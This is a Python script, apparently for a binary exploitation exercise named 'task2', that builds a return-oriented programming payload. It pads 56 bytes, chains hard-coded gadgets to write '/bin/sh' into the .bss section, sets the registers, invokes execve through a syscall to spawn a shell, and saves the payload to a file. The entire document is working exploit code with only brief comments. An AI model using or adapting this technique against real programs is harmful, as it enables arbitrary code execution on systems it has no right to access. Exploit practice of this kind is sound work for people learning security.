#!/usr/bin/env python

from struct import *


if __name__ == '__main__':
	bss = 0x404020

	buf = b'A'*56

	# create "/bin/sh" in the writable .bss section
	buf += pack('<Q', 0x40116d)         # pop rsi ; pop rdi; ret
	buf += pack('<Q', 0x68732f6e69622f) # new rsi - "/bin/sh\x00" raw values
	buf += pack('<Q', bss)              # .bss start addr
	buf += pack('<Q', 0x401169)         # mov qword ptr [rdi], rsi ; ret

	# create an empty array of strings
	buf += pack('<Q', 0x40116d)         # pop rsi ; pop rdi; ret
	buf += pack('<Q', 0x000000)         # new rsi - "\x00" raw values
	buf += pack('<Q', bss + 8)          # .bss start addr
	buf += pack('<Q', 0x401169)         # mov qword ptr [rdi], rsi ; ret

	# setup the registers for syscall and envoke execve
	buf += pack('<Q', 0x40116d)         # pop rsi ; pop rdi; ret
	buf += pack('<Q', bss + 8)          # new rsi - pointer to 0
	buf += pack('<Q', bss)              # .bss start addr
	buf += pack('<Q', 0x401160)         # xor rax, rax ; pop rdx ; ret
	buf += pack('<Q', bss + 8)          # new rdx - pointer to 0
	buf += pack('<Q', 0x401165) * 0x3b  # inc rax ; ret
	buf += pack('<Q', 0x40115e)         # syscall

	with open('task2.exp', 'wb+') as f:
		f.write(buf)
